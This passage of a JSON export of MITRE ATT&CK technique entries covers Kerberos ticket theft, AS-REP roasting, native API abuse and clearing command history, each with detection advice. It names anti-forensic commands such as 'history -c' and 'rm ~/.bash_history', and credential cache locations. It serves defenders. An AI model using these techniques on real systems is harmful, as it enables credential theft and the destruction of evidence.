      "modified": "2025-04-15T23:06:48.799000+00:00",
      "platforms": [
        "Windows",
        "IaaS",
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content",
        "Sensor Health: Host Status",
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.\n\nIn addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.\n\nExternally monitor the availability of services that may be targeted by an Endpoint DoS."
    },
    "T1195.003": {
      "id": "T1195.003",
      "name": "Compromise Hardware Supply Chain",
      "description": "Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.",
      "tactic": "initial-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1195.003",
      "stix_id": "attack-pattern--39131305-9282-45e4-ac3b-591d2d4fc3ef",
      "created": "2020-03-11T14:28:40.064000+00:00",
      "modified": "2025-04-15T22:07:50.636000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Sensor Health: Host Status"
      ],
      "defense_bypassed": [],
      "detection": "Perform physical inspection of hardware to look for potential tampering. Perform integrity checking on pre-OS boot mechanisms that can be manipulated for malicious purposes."
    },
    "T1106": {
      "id": "T1106",
      "name": "Native API",
      "description": "Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.(Citation: OutFlank System Calls)(Citation: CyberBit System Calls)(Citation: MDSec System Calls) For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC)\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks.(Citation: Redops Syscalls) Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001).",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1106",
      "stix_id": "attack-pattern--391d824f-0ef1-47a0-b0ee-c59a75e27670",
      "created": "2017-05-31T21:31:17.472000+00:00",
      "modified": "2025-04-15T19:58:23.043000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Module: Module Load"
      ],
      "defense_bypassed": [],
      "detection": "Monitoring API calls may generate a significant amount of data and may not be useful for defense unless collected under specific circumstances, since benign use of API functions are common and may be difficult to distinguish from malicious behavior. Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior. Correlation of activity by process lineage by process ID may be sufficient. \n\nUtilization of the Windows APIs may involve processes loading/accessing system DLLs associated with providing called functions (ex: ntdll.dll, kernel32.dll, advapi32.dll, user32.dll, and gdi32.dll). Monitoring for DLL loads, especially to abnormal/unusual or potentially malicious processes, may indicate abuse of the Windows API. Though noisy, this data can be combined with other indicators to identify adversary activity. "
    },
    "T1558.005": {
      "id": "T1558.005",
      "name": "Ccache Files",
      "description": "\nAdversaries may attempt to steal Kerberos tickets stored in credential cache files (or ccache). These files are used for short term storage of a user's active session credentials. The ccache file is created upon user authentication and allows for access to multiple services without the user having to re-enter credentials. \n\nThe <code>/etc/krb5.conf</code> configuration file and the <code>KRB5CCNAME</code> environment variable are used to set the storage location for ccache entries. On Linux, credentials are typically stored in the `/tmp` directory with a naming format of `krb5cc_%UID%` or `krb5.ccache`. On macOS, ccache entries are stored by default in memory with an `API:{uuid}` naming scheme. Typically, users interact with ticket storage using <code>kinit</code>, which obtains a Ticket-Granting-Ticket (TGT) for the principal; <code>klist</code>, which lists obtained tickets currently held in the credentials cache; and other built-in binaries.(Citation: Kerberos GNU/Linux)(Citation: Binary Defense Kerberos Linux)\n\nAdversaries can collect tickets from ccache files stored on disk and authenticate as the current user without their password to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks. Adversaries can also use these tickets to impersonate legitimate users with elevated privileges to perform [Privilege Escalation](https://attack.mitre.org/tactics/TA0004). Tools like Kekeo can also be used by adversaries to convert ccache files to Windows format for further [Lateral Movement](https://attack.mitre.org/tactics/TA0008). On macOS, adversaries may use open-source tools or the Kerberos framework to interact with ccache files and extract TGTs or Service Tickets via lower-level APIs.(Citation: SpectorOps Bifrost Kerberos macOS 2019)(Citation: Linux Kerberos Tickets)(Citation: Brining MimiKatz to Unix)(Citation: Kekeo) ",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1558.005",
      "stix_id": "attack-pattern--394220d9-8efc-4252-9040-664f7b115be6",
      "created": "2024-09-17T15:02:31.324000+00:00",
      "modified": "2025-04-15T21:56:03.788000+00:00",
      "platforms": [
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Access"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1070.007": {
      "id": "T1070.007",
      "name": "Clear Network Connection History and Configurations",
      "description": "Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such as [Remote Services](https://attack.mitre.org/techniques/T1021) or [External Remote Services](https://attack.mitre.org/techniques/T1133). Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.\n\nNetwork connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under (Citation: Microsoft RDP Removal):\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers</code>\n\nWindows may also store information about recent RDP connections in files such as <code>C:\\Users\\\\%username%\\Documents\\Default.rdp</code> and `C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Terminal\nServer Client\\Cache\\`.(Citation: Moran RDPieces) Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in `/Library/Logs` and/or `/var/log/`).(Citation: Apple Culprit Access)(Citation: FreeDesktop Journal)(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)\n\nMalicious network connections may also require changes to third-party applications or network configuration settings, such as [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004) or tampering to enable [Proxy](https://attack.mitre.org/techniques/T1090). Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1070.007",
      "stix_id": "attack-pattern--3975dbb5-0e1e-4f5b-bae1-cf2ab84b46dc",
      "created": "2022-06-15T18:00:04.219000+00:00",
      "modified": "2025-04-16T20:37:16.734000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Windows Registry: Windows Registry Key Modification",
        "Command: Command Execution",
        "Firewall: Firewall Rule Modification",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1558.004": {
      "id": "T1558.004",
      "name": "AS-REP Roasting",
      "description": "Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by [Password Cracking](https://attack.mitre.org/techniques/T1110/002) Kerberos messages.(Citation: Harmj0y Roasting AS-REPs Jan 2017) \n\nPreauthentication offers protection against offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002). When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user\u2019s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user\u2019s password.(Citation: Microsoft Kerberos Preauth 2014)\n\nFor each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002) attacks similarly to [Kerberoasting](https://attack.mitre.org/techniques/T1558/003) and expose plaintext credentials. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019) \n\nAn account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like [PowerShell](https://attack.mitre.org/techniques/T1059/001) with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1558.004",
      "stix_id": "attack-pattern--3986e7fd-a8e9-4ecb-bfc6-55920855912b",
      "created": "2020-08-24T13:43:00.028000+00:00",
      "modified": "2025-04-15T19:58:23.309000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Active Directory: Active Directory Credential Request"
      ],
      "defense_bypassed": [],
      "detection": "Enable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4768 and 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17], pre-authentication not required [Type: 0x0]).(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Microsoft Detecting Kerberoasting Feb 2018)(Citation: Microsoft 4768 TGT 2017)"
    },
    "T1584.003": {
      "id": "T1584.003",
      "name": "Virtual Private Server",
      "description": "Adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.(Citation: NSA NCSC Turla OilRig)\n\nCompromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1584.003",
      "stix_id": "attack-pattern--39cc9f64-cf74-4a48-a4d8-fe98c54a02e0",
      "created": "2020-10-01T00:55:17.771000+00:00",
      "modified": "2025-04-15T23:19:04.087000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Internet Scan: Response Content",
        "Internet Scan: Response Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Once adversaries have provisioned software on a compromised VPS (ex: for use as a command and control server), internet scans may reveal VPSs that adversaries have compromised. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021)\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control."
    },
    "T1059.010": {
      "id": "T1059.010",
      "name": "AutoHotKey & AutoIT",
      "description": "Adversaries may execute commands and perform malicious tasks using AutoIT and AutoHotKey automation scripts. AutoIT and AutoHotkey (AHK) are scripting languages that enable users to automate Windows tasks. These automation scripts can be used to perform a wide variety of actions, such as clicking on buttons, entering text, and opening and closing programs.(Citation: AutoIT)(Citation: AutoHotKey)\n\nAdversaries may use AHK (`.ahk`) and AutoIT (`.au3`) scripts to execute malicious code on a victim's system. For example, adversaries have used for AHK to execute payloads and other modular malware such as keyloggers. Adversaries have also used custom AHK files containing embedded malware as [Phishing](https://attack.mitre.org/techniques/T1566) payloads.(Citation: Splunk DarkGate)\n\nThese scripts may also be compiled into self-contained executable payloads (`.exe`).(Citation: AutoIT)(Citation: AutoHotKey)",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1059.010",
      "stix_id": "attack-pattern--3a32740a-11b0-4bcf-b0a9-3abd0f6d3cd5",
      "created": "2024-03-29T18:07:04.743000+00:00",
      "modified": "2025-04-15T19:58:23.600000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1600.001": {
      "id": "T1600.001",
      "name": "Reduce Key Space",
      "description": "Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.(Citation: Cisco Synful Knock Evolution)\n\nAdversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.\n\nAdversaries may modify the key size used and other encryption parameters using specialized commands in a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) introduced to the system through [Modify System Image](https://attack.mitre.org/techniques/T1601) to change the configuration of the device. (Citation: Cisco Blog Legacy Device Attacks)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1600.001",
      "stix_id": "attack-pattern--3a40f208-a9c1-4efa-a598-4003c3681fb8",
      "created": "2020-10-19T19:03:48.310000+00:00",
      "modified": "2025-04-25T14:46:24.048000+00:00",
      "platforms": [
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "There is no documented method for defenders to directly identify behaviors that reduce encryption key space. Detection efforts may be focused on closely related adversary behaviors, such as [Modify System Image](https://attack.mitre.org/techniques/T1601) and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008). Some detection methods require vendor support to aid in investigation."
    },
    "T1070.003": {
      "id": "T1070.003",
      "name": "Clear Command History",
      "description": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions. Adversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A) On ESXi servers, command history may be manually removed from the `/var/log/shell.log` file.(Citation: Broadcom ESXi Shell Audit)\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1070.003",
      "stix_id": "attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a",
      "created": "2020-01-31T12:32:08.228000+00:00",
      "modified": "2025-04-15T19:58:23.774000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "File: File Deletion",
        "File: File Modification",
        "Command: Command Execution",
        "User Account: User Account Authentication"
      ],
      "defense_bypassed": [],
      "detection": "User authentication, especially via remote terminal services like SSH, without new entries in that user's <code>~/.bash_history</code> is suspicious. Additionally, the removal/clearing of the <code>~/.bash_history</code> file can be an indicator of suspicious activity.\n\nMonitor for suspicious modifications or deletion of <code>ConsoleHost_history.txt</code> and use of the <code>Clear-History</code> command."
    },
    "T1202": {
      "id": "T1202",
      "name": "Indirect Command Execution",
      "description": "Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (`pcalua.exe`), components of the Windows Subsystem for Linux (WSL), `Scriptrunner.exe`, as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts.(Citation: VectorSec ForFiles Aug 2017)(Citation: Evi1cg Forfiles Nov 2017)(Citation: Secure Team - Scriptrunner.exe)(Citation: SS64)(Citation: Bleeping Computer - Scriptrunner.exe) Adversaries may also abuse the `ssh.exe` binary to execute malicious commands via the `ProxyCommand` and `LocalCommand` options, which can be invoked via the `-o` flag or by modifying the SSH config file.(Citation: Threat Actor Targets the Manufacturing industry with Lumma Stealer and Amadey Bot)\n\nAdversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1202",
      "stix_id": "attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-15T19:58:23.859000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor and analyze logs from host-based detection mechanisms, such as Sysmon, for events such as process creations that include or are resulting from parameters associated with invoking programs/commands/files and/or spawning child processes/network connections. (Citation: RSA Forfiles Aug 2017)"
    },
    "T1091": {
      "id": "T1091",
      "name": "Replication Through Removable Media",
      "description": "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.\n\nMobile devices may also be used to infect PCs with malware if connected via USB.(Citation: Exploiting Smartphone USB ) This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables.(Citation: Windows Malware Infecting Android)(Citation: iPhone Charging Cable Hack) For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).",
      "tactic": "lateral-movement",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1091",
      "stix_id": "attack-pattern--3b744087-9945-4a6f-91e8-9dbceda417a4",
      "created": "2017-05-31T21:31:08.977000+00:00",
      "modified": "2025-04-15T19:58:24.231000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Access",
        "Process: Process Creation",
        "Drive: Drive Creation",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor file access on removable media. Detect processes that execute from removable media after it is mounted or when initiated by a user. If a remote access tool is used in this manner to move laterally, then additional actions are likely to occur after execution, such as opening network connections for Command and Control and system and network information Discovery."
    },
    "T1005": {
      "id": "T1005",
      "name": "Data from Local System",
      "description": "Adversaries may search local system sources, such as file systems, configuration files, local databases, or virtual machine files, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1005",
      "stix_id": "attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5",
      "created": "2017-05-31T21:30:20.537000+00:00",
      "modified": "2025-04-15T19:58:24.318000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Script: Script Execution",
        "Command: Command Execution",
        "Process: Process Creation",
        "File: File Access"
      ],
      "defense_bypassed": [],
      "detection": "Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands may also be used to collect files such as configuration files with built-in features native to the network device platform.(Citation: Mandiant APT41 Global Intrusion )(Citation: US-CERT-TA18-106A) Monitor CLI activity for unexpected or unauthorized use commands being run by non-standard users from non-standard locations. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nFor network infrastructure devices, collect AAA logging to monitor `show` commands that view configuration files. "
    },
    "T1140": {
      "id": "T1140",
      "name": "Deobfuscate/Decode Files or Information",
      "description": "Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file.(Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> or <code>type</code> command to reassemble binary fragments into a malicious payload.(Citation: Carbon Black Obfuscation Sept 2016)(Citation: Sentinel One Tainted Love 2023)\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.(Citation: Volexity PowerDuke November 2016)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1140",
      "stix_id": "attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c",
      "created": "2017-12-14T16:46:06.044000+00:00",
      "modified": "2025-04-15T19:58:24.400000+00:00",
      "platforms": [
        "ESXi",
        "Linux",
        "Windows",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Script: Script Execution",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "Detecting the action of deobfuscating or decoding files or information may be difficult depending on the implementation. If the functionality is contained within malware and uses the Windows API, then attempting to detect malicious behavior before or after the action may yield better results than attempting to perform analysis on loaded libraries or API calls. If scripts are used, then collecting the scripts for analysis may be necessary. Perform process and command-line monitoring to detect potentially malicious behavior related to scripts and system utilities such as [certutil](https://attack.mitre.org/software/S0160).\n\nMonitor the execution file paths and command-line arguments for common archive file applications and extensions, such as those for Zip and RAR archive tools, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior."
    },
    "T1137.005": {
      "id": "T1137.005",
      "name": "Outlook Rules",
      "description": "Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.(Citation: SilentBreak Outlook Rules)\n\nOnce malicious rules have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.(Citation: SilentBreak Outlook Rules)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1137.005",
      "stix_id": "attack-pattern--3d1b9d7e-3921-4d25-845a-7d9f15c0da44",
      "created": "2019-11-07T20:00:25.560000+00:00",
      "modified": "2025-04-15T22:55:47.125000+00:00",
      "platforms": [
        "Windows",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Application Log: Application Log Content",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) This PowerShell script is ineffective in gathering rules with modified `PRPR_RULE_MSG_NAME` and `PR_RULE_MSG_PROVIDER` properties caused by adversaries using a Microsoft Exchange Server Messaging API Editor (MAPI Editor), so only examination with the Exchange Administration tool MFCMapi can reveal these mail forwarding rules.(Citation: Pfammatter - Hidden Inbox Rules) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)\n\nCollect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior."
    },
    "T1562": {
      "id": "T1562",
      "name": "Impair Defenses",
      "description": "Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.\n\nAdversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out, preventing a system from shutting down, or disabling or modifying the update process. Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components. These restrictions can further enable malicious operations as well as the continued propagation of incidents.(Citation: Google Cloud Mandiant UNC3886 2024)(Citation: Emotet shutdown)\n\n",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1562",
      "stix_id": "attack-pattern--3d333250-30e4-4a82-9edc-756c68afc529",
      "created": "2020-02-21T20:22:13.470000+00:00",
      "modified": "2025-04-15T19:58:24.596000+00:00",
      "platforms": [
        "Windows",
        "IaaS",
        "Linux",
        "macOS",
        "Containers",
        "Network Devices",
        "Identity Provider",
        "Office Suite",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification",
        "Cloud Service: Cloud Service Disable",
        "Firewall: Firewall Rule Modification",
        "Command: Command Execution",
        "Script: Script Execution",
        "Process: Process Modification",
        "Windows Registry: Windows Registry Key Deletion",
        "Process: Process Termination",
        "Service: Service Metadata",
        "Process: Process Metadata",
        "Cloud Service: Cloud Service Modification",
        "User Account: User Account Modification",
        "File: File Deletion",
        "Sensor Health: Host Status",
        "Process: OS API Execution",
        "Process: Process Creation",
        "Windows Registry: Windows Registry Key Modification",
        "Driver: Driver Load",
        "Firewall: Firewall Disable"
      ],
      "defense_bypassed": [],
      "detection": "Monitor processes and command-line arguments to see if security tools or logging services are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools.  Lack of log events may be suspicious.\n\nMonitor environment variables and APIs that can be leveraged to disable security measures."
    },
    "T1586.003": {
      "id": "T1586.003",
      "name": "Cloud Accounts",
